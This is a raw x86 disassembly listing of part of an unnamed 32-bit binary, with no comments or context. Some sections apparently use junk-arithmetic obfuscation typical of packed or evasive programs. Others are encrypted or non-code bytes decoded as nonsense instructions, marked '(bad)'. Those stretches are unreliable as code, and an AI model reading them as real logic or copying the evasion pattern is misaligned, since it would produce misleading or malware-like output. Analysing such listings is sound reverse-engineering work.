  4166be:	rcr    BYTE PTR [esi],1
  4166c0:	and    eax,0x6c8a68a8
  4166c5:	xchg   ebp,eax
  4166c6:	int    0x41
  4166c8:	aad    0x76
  4166ca:	fcompp 
  4166cc:	sub    eax,0x5fdd76d8
  4166d1:	jne    0x4166b3
  4166d3:	jecxz  0x416727
  4166d5:	add    al,0xa
  4166d7:	(bad)  
  4166d8:	sbb    ecx,eax
  4166da:	lock push ebp
  4166dc:	push   edi
  4166dd:	pop    ebx
  4166de:	xchg   esi,eax
  4166df:	pop    ds
  4166e0:	into   
  4166e1:	sub    al,0xdd
  4166e3:	or     eax,0xd2e3ff56
  4166e8:	push   es
  4166e9:	mov    cl,BYTE PTR [edi+0x42]
  4166ec:	inc    DWORD PTR [ebp+0x67]
  4166ef:	mov    es,ecx
  4166f1:	mov    dl,0x30
  4166f3:	xchg   esp,eax
  4166f4:	(bad)  
  4166f5:	std    
  4166f6:	mov    al,ds:0x70be06e9
  4166fb:	sub    DWORD PTR [ecx],ebp
  4166fd:	dec    ebp
  4166fe:	leave  
  4166ff:	sbb    ebp,DWORD PTR [ebp-0x2d]
  416702:	jo     0x41668a
  416704:	scas   eax,DWORD PTR es:[edi]
  416705:	mov    ebp,0x8e823793
  41670a:	fs inc edx
  41670c:	and    al,0xcf
  41670e:	sbb    DWORD PTR ds:0x22599a14,esi
  416714:	shl    DWORD PTR [edx],0x7e
  416717:	pop    esp
  416718:	push   ebx
  416719:	add    dl,cl
  41671b:	push   edi
  41671c:	test   BYTE PTR [edi],ah
  41671e:	fnsave [ecx+0x40]
  416721:	and    DWORD PTR [esi+0x1f0b16b2],ebp
  416727:	lahf   
  416728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416729:	push   ss
  41672a:	mov    ebx,0xa21403e3
  41672f:	data16 lods al,BYTE PTR ds:[esi]
  416731:	adc    DWORD PTR [edi+0x30cd5e20],ebp
  416737:	into   
  416738:	xchg   ecx,eax
  416739:	dec    eax
  41673a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41673b:	ss push es
  41673d:	enter  0x61a1,0x1c
  416741:	icebp  
  416742:	dec    DWORD PTR [ebp+0x29c69b71]
  416748:	in     al,0x63
  41674a:	hlt    
  41674b:	mov    al,ds:0xf555bc89
  416750:	pop    di
  416752:	sub    al,bh
  416754:	(bad)  
  416756:	mov    ch,0xf0
  416758:	lahf   
  416759:	cwde   
  41675a:	sub    al,0xb1
  41675c:	jle    0x41675b
  41675e:	push   ebp
  41675f:	ret    
  416760:	push   edi
  416761:	xor    al,0x8f
  416763:	out    0xc,eax
  416765:	cmp    eax,0xa91452c1
  41676a:	xor    DWORD PTR [ebp+0x46],esi
  41676d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41676e:	and    al,0xe0
  416770:	mov    ebx,0xa061eed2
  416775:	cmp    al,0x1
  416777:	out    0x28,eax
  416779:	and    ax,0x88c7
  41677d:	add    al,0x1a
  41677f:	mov    eax,DWORD PTR [ebp-0x38]
  416782:	add    eax,DWORD PTR [ebp-0x3c]
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422574
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422560
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428555,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428569,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x4284d5,0x96c
  416847:	cmp    DWORD PTR ds:0x428555,0x0
  41684e:	jbe    0x416866
  416854:	push   0x428147
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428565
  416866:	and    DWORD PTR ds:0x4284c9,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x428429
  416876:	sub    ecx,DWORD PTR ds:0x428501
  41687c:	mov    DWORD PTR ds:0x428429,ecx
  416882:	mov    ecx,DWORD PTR ds:0x422928
  416888:	and    DWORD PTR ds:0x428375,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428565,0x4284d9
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42845d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x428349,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x42841d,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428355,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42845d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42847d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x42841d
  4168f9:	movzx  eax,WORD PTR ds:0x428479
  416900:	cmp    DWORD PTR ds:0x42841d,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428579
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x428335,0x42841d
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428365,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x42854d,0x428569
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x428411,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428475
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42845d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428561,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x42840d,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x428445,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42835d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x42832d,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428351
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	mov    bp,0xdd00
  416a31:	or     al,0xd4
  416a33:	sar    BYTE PTR [esi-0x41413dcb],0xb6
  416a3a:	idiv   BYTE PTR [ebp+0x6616878c]
  416a40:	mov    ebp,0xb6ce7843
  416a45:	add    al,BYTE PTR ds:0xb9ee2e22
  416a4b:	stos   DWORD PTR es:[edi],eax
  416a4c:	adc    bl,BYTE PTR [eax+0x42]
  416a4f:	and    al,bh
  416a51:	std    
  416a52:	jno    0x416a0d
  416a54:	mov    eax,ds:0x17908f1d
  416a59:	adc    eax,0xa02af966
  416a5e:	sub    ah,bh
  416a60:	fimul  WORD PTR [esi]
  416a62:	(bad)  
  416a64:	arpl   bp,si
  416a66:	pop    ecx
  416a67:	inc    eax
  416a68:	or     ebp,ecx
  416a6a:	mov    ebp,edi
  416a6c:	cld    
  416a6d:	enter  0x1174,0x3
  416a71:	xchg   edx,eax
  416a72:	stos   BYTE PTR es:[edi],al
  416a73:	pop    ds
  416a74:	xchg   esi,eax
  416a75:	outs   dx,DWORD PTR ds:[esi]
  416a76:	jmp    0x416a54
  416a78:	dec    esi
  416a79:	sub    DWORD PTR [ebp+0x23],0x1d
  416a7d:	clc    
  416a7e:	xlat   BYTE PTR ds:[ebx]
  416a7f:	xchg   edi,eax
  416a80:	stos   BYTE PTR es:[edi],al
  416a81:	jo     0x416ac3
  416a83:	cmc    
  416a84:	outs   dx,DWORD PTR ds:[esi]
  416a85:	fwait
  416a86:	sbb    cl,BYTE PTR [ebp+0x64]
  416a89:	sbb    ch,BYTE PTR [ebp+ecx*4-0x2c]
  416a8d:	and    eax,0x66611fab
  416a92:	mov    ebx,0xcdf081d3
  416a97:	ja     0x416a49
  416a99:	dec    esi
  416a9a:	jmp    0xaffcfe2a
  416a9f:	xbegin 0x681d867
  416aa5:	pop    esp
  416aa6:	add    ebx,DWORD PTR [edi]
  416aa8:	das    
  416aa9:	xor    BYTE PTR [ecx-0x75c0e77e],ch
  416aaf:	ins    DWORD PTR es:[edi],dx
  416ab0:	pop    esi
  416ab1:	xchg   edi,eax
  416ab2:	pusha  
  416ab3:	stos   BYTE PTR es:[edi],al
  416ab4:	jne    0x416a83
  416ab6:	pop    esi
  416ab7:	adc    edx,esi
  416ab9:	push   ds
  416aba:	cld    
  416abb:	xchg   edi,eax
  416abc:	das    
  416abd:	scas   eax,DWORD PTR es:[edi]
  416abe:	std    
  416abf:	inc    esp
  416ac0:	jnp    0x416acd
  416ac2:	sbb    eax,0x8b4f0c30
  416ac7:	mov    ds:0x76ff8cba,al
  416acc:	xchg   esp,eax
  416acd:	sbb    eax,0x8820cc04
  416ad2:	dec    ebx
  416ad3:	int    0x26
  416ad5:	pop    es
  416ad6:	pop    eax
  416ad7:	jbe    0x416ae3
  416ad9:	push   edx
  416ada:	imul   DWORD PTR [edi+ebx*1+0x68]
  416ade:	mov    ds:0x25060087,al
  416ae3:	cld    
  416ae4:	xchg   ebx,eax
  416ae5:	inc    esi
  416ae6:	push   edx
  416ae7:	pop    esp
  416ae8:	push   ds
  416ae9:	fdiv   DWORD PTR [edx+0x29cbbcaf]
  416aef:	sbb    sp,WORD PTR [edi+edx*2+0x4b]
  416af4:	test   eax,0xaae211bf
  416af9:	sbb    ch,BYTE PTR [edi-0x6e]
  416afc:	inc    esp
  416afd:	pop    ds
  416afe:	pop    esp
  416aff:	xor    BYTE PTR [edx],cl
  416b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b02:	gs iret 
  416b04:	mov    ah,0xa4
  416b06:	xor    ebx,ebx
  416b08:	in     eax,0x61
  416b0a:	xchg   BYTE PTR [eax-0x1c9d709d],bh
  416b10:	int3   
  416b11:	(bad)  [edi-0x2]
  416b14:	jge    0x416ac0
  416b16:	fs retf 
  416b18:	inc    eax
  416b19:	mov    eax,0xab983f39
  416b1e:	jle    0x416b6b
  416b20:	ret    
  416b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b22:	or     eax,0x746be16e
  416b27:	stos   BYTE PTR es:[edi],al
  416b28:	inc    esp
  416b29:	shl    DWORD PTR [edx-0x1d719efa],cl
  416b2f:	pushf  
  416b30:	mov    dl,0x70
  416b32:	sub    edi,DWORD PTR [edx]
  416b34:	stos   DWORD PTR es:[edi],eax
  416b35:	popa   
  416b36:	jl     0x416ba7
  416b38:	pop    ecx
  416b39:	mov    edx,0x8d08f301
  416b3e:	push   ebp
  416b40:	add    al,0xad
  416b42:	test   al,0xee
  416b44:	arpl   WORD PTR [ecx],bx
  416b46:	outs   dx,BYTE PTR ds:[esi]
  416b47:	sbb    eax,0xa1744ef2
  416b4c:	mov    dl,0xb6
  416b4e:	mov    eax,0x7f163dc6
  416b53:	icebp  
  416b54:	std    
  416b55:	cwde   
  416b56:	dec    edi
  416b57:	mov    bh,bl
  416b59:	jp     0x416b81
  416b5b:	mov    dl,BYTE PTR [ecx]
  416b5d:	cdq    
  416b5e:	lods   al,BYTE PTR ds:[esi]
  416b5f:	cmp    ebp,DWORD PTR [edx+0x4e]
  416b62:	pop    esp
  416b63:	cmc    
  416b64:	pop    bp
  416b66:	adc    al,0x72
  416b68:	cwde   
  416b69:	mov    ecx,0x5c443942
  416b6e:	dec    ecx
  416b6f:	jbe    0x416b99
  416b71:	outs   dx,DWORD PTR ds:[esi]
  416b72:	stc    
  416b73:	push   ds
  416b74:	aad    0xa7
  416b76:	cmp    dh,BYTE PTR [edx+eax*1-0x2e]
  416b7a:	fistp  QWORD PTR [esi+0x20]
  416b7d:	inc    ebp
  416b7e:	xchg   ebx,eax
  416b7f:	nop
  416b80:	and    al,0x5b
  416b82:	adc    bl,ch
  416b84:	pop    eax
  416b85:	xchg   bp,ax
  416b87:	out    0x47,al
  416b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b8a:	dec    ecx
  416b8b:	outs   dx,BYTE PTR ds:[esi]
  416b8c:	and    DWORD PTR [esi],esp
  416b8e:	and    BYTE PTR [ecx+ebp*8],0x21
  416b92:	ins    DWORD PTR es:[edi],dx
  416b93:	es int3 
  416b95:	out    dx,al
  416b96:	ins    DWORD PTR es:[edi],dx
  416b97:	mov    esi,0xa2e10038
  416b9c:	xchg   edx,eax
  416b9d:	fdiv   DWORD PTR [eax+0x6d]
  416ba0:	cmp    eax,0x1c1687ac
  416ba5:	popf   
  416ba6:	push   esp
  416ba7:	pop    ebx
  416ba8:	xlat   BYTE PTR ds:[ebx]
  416ba9:	sub    BYTE PTR [edx],dh
  416bab:	pop    ebx
  416bac:	sbb    edi,eax
  416bae:	call   0xbedd:0x32353139
  416bb5:	jo     0x416b72
  416bb7:	inc    edx
  416bb8:	loop   0x416bf5
  416bba:	push   es
  416bbb:	call   0xea5023bd
  416bc0:	cli    
  416bc1:	hlt    
  416bc2:	loop   0x416b63
  416bc4:	into   
  416bc5:	xor    eax,esp
  416bc7:	mov    eax,ds:0xda6f12ad
  416bcc:	cli    
  416bcd:	loope  0x416c27
  416bcf:	fcos   
  416bd1:	loop   0x416bd4
  416bd3:	fstp   TBYTE PTR [edx]
  416bd5:	aas    
  416bd6:	cmp    al,0x36
  416bd8:	push   ecx
  416bd9:	ja     0x416bef
  416bdb:	outs   dx,DWORD PTR ds:[esi]
  416bdc:	mov    ecx,0x7da0c5f0
  416be1:	call   0x8a9d:0x22bf8567
  416be8:	mov    ecx,DWORD PTR [edx-0x2e]
  416beb:	(bad)  
  416bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bee:	or     al,0xb9
  416bf0:	add    BYTE PTR [ecx+0x6fe796f8],bh
  416bf6:	pop    ecx
  416bf7:	adc    ebp,DWORD PTR [eax+0x7fde372a]
  416bfd:	adc    DWORD PTR [ebp+0x3235cdb9],0xffffffaa
  416c04:	xor    al,0x83
  416c06:	dec    edx
  416c07:	jmp    0x80c67b41
  416c0c:	and    DWORD PTR [edi],ebp
  416c0e:	das    
  416c0f:	(bad)  
  416c10:	ins    BYTE PTR es:[edi],dx
  416c11:	push   cs
  416c12:	gs push ebx
  416c14:	clc    
  416c15:	nop
  416c16:	fnstenv ds:0x48ea5ae7
  416c1c:	push   cs
  416c1d:	test   BYTE PTR ds:0x6da931ad,cl
  416c23:	sub    bl,BYTE PTR [edi]
  416c25:	call   0xb10f:0xa3990b64
  416c2c:	mov    WORD PTR [eax],fs
  416c2e:	inc    esi
  416c2f:	test   al,0x75
  416c31:	adc    esi,0x34
  416c34:	push   edx
  416c35:	inc    ebp
  416c36:	sbb    al,0xb8
  416c38:	inc    eax
  416c39:	xor    eax,0xb020c31c
  416c3e:	sub    dl,BYTE PTR [edi]
  416c40:	adc    edi,DWORD PTR [ebp+ecx*1-0x56]
  416c44:	push   ebx
  416c45:	aas    
  416c46:	out    dx,al
  416c47:	adc    dh,BYTE PTR [ebx+0x5f1472ef]
  416c4d:	sbb    eax,0x5fc44fcd
  416c53:	in     eax,0x86
  416c55:	push   eax
  416c56:	sub    BYTE PTR [ecx+0x19],ch
  416c59:	mov    ah,0x6f
  416c5b:	jg     0x416cc6
  416c5d:	pop    esi
  416c5e:	push   ecx
  416c5f:	idiv   BYTE PTR [ecx-0x6c765400]
  416c65:	(bad)  
  416c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c67:	arpl   WORD PTR [eax],bx
  416c69:	xor    eax,0xc2e5ba4f
  416c6e:	(bad)  
  416c6f:	int    0x3a
  416c71:	repz inc eax
  416c73:	dec    edx
  416c74:	clc    
  416c75:	and    eax,0xc7b2bc1c
  416c7a:	inc    esp
  416c7b:	and    al,0x50
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x428431
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x428439,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x4284f1,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x4284d5,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428359,0x0
  416d09:	mov    DWORD PTR ds:0x428341,edi
  416d0f:	mov    DWORD PTR ds:0x428445,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x4284fd,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x428419,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428359,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428561,0x42836d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428365
  416d72:	adc    DWORD PTR ds:0x428439,ecx
  416d78:	cmp    DWORD PTR ds:0x428555,0x0
  416d7f:	mov    DWORD PTR ds:0x428579,edi
  416d85:	mov    DWORD PTR ds:0x428579,ebx
  416d8b:	mov    DWORD PTR ds:0x42840d,0x662b
  416d95:	mov    DWORD PTR ds:0x428561,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428355,ebx
  416daa:	cmp    DWORD PTR ds:0x428555,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x4281db
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x428531
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42856d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428551
  416de1:	and    DWORD PTR ds:0x428461,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428359
  416df3:	add    DWORD PTR ds:0x42833d,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428369,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428481,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428351,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x428431
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x42854d,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x428545
  416e57:	mov    ecx,DWORD PTR ds:0x428481
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428451,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x42854d,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x428411,edi
  416e87:	and    DWORD PTR ds:0x428371,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x428441
  416e97:	or     DWORD PTR ds:0x428575,ecx
  416e9d:	add    DWORD PTR ds:0x4284e1,ebx
  416ea3:	or     DWORD PTR ds:0x4284d1,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428365
  416eb3:	sub    DWORD PTR ds:0x4284c9,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428375,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x42840d,0x0
  416ecf:	mov    DWORD PTR ds:0x428331,0x5921
  416ed9:	mov    DWORD PTR ds:0x4284e1,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x42840d,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428351
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x4284d1,0x2a49
  416f10:	and    DWORD PTR ds:0x428561,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42845d
  416f21:	adc    DWORD PTR ds:0x428475,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x428545
  416f2d:	adc    DWORD PTR ds:0x428421,ecx
  416f33:	or     DWORD PTR ds:0x428361,0x75b4
  416f3d:	adc    DWORD PTR ds:0x4284c5,edx
  416f43:	or     DWORD PTR ds:0x4284fd,0x469c
  416f4d:	or     DWORD PTR ds:0x428459,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428461,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x428421
  416f70:	or     ecx,DWORD PTR ds:0x428501
  416f76:	mov    DWORD PTR ds:0x428421,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428555,0x428551
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428375,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x428405,0x428445
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428551,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x428349,0x42832d
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x42832d,0x428365
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428459,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42836d,0x42832d
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x428425,0x4284f5
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x4284d1,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428451,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x4284d5,0x0
  417044:	not    DWORD PTR ds:0x428419
  41704a:	mov    DWORD PTR ds:0x4284dd,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42835d
  417060:	cmp    DWORD PTR ds:0x4284d5,0x0
  417067:	jae    0x41709b
  41706d:	push   0x4281b5
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x428339,edi
  417091:	xor    DWORD PTR ds:0x428459,0x58f
  41709b:	sbb    DWORD PTR ds:0x42846d,ecx
  4170a1:	sub    DWORD PTR ds:0x428561,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x4283dd
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428581,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428461
  4170c0:	add    esi,DWORD PTR ds:0x428501
  4170c6:	mov    DWORD PTR ds:0x428461,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42836d,0x428441
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x4170ec
  417104:	xchg   DWORD PTR [eax-0x3f277b31],eax
  41710a:	mov    esi,0xbebec235
  41710f:	scas   al,BYTE PTR es:[edi]
  417110:	aam    0xc3
  417112:	rcr    edi,0xdf
  417115:	inc    esi
  417116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417117:	push   ebx
  417118:	lea    esi,[esi+0x5e]
  41711b:	mov    ah,0x5e
  41711d:	jle    0x4170a0
  41711f:	sahf   
  417120:	xor    eax,0xd616d596
  417125:	jns    0x4170d7
  417127:	xchg   al,dh
  417129:	fwait
  41712a:	mov    ecx,0x73f00efd
  41712f:	inc    esi
  417131:	cld    
  417132:	pop    edx
  417133:	fistp  QWORD PTR [eax]
  417135:	xchg   esp,eax
  417136:	sub    bl,BYTE PTR [ecx+0x691b6905]
  41713c:	shl    eax,cl
  41713e:	jo     0x417105
  417140:	dec    eax
  417141:	lods   al,BYTE PTR ds:[esi]
  417142:	sahf   
  417143:	data16 mov al,bh
  417146:	mov    cl,BYTE PTR [edi]
  417148:	xor    DWORD PTR fs:[edi+0x58],0x2d83df13
  417150:	cmp    dh,BYTE PTR [ebp+0x4990e86e]
  417156:	xor    ecx,DWORD PTR [ebx+0x2e87e69d]
  41715c:	inc    esp
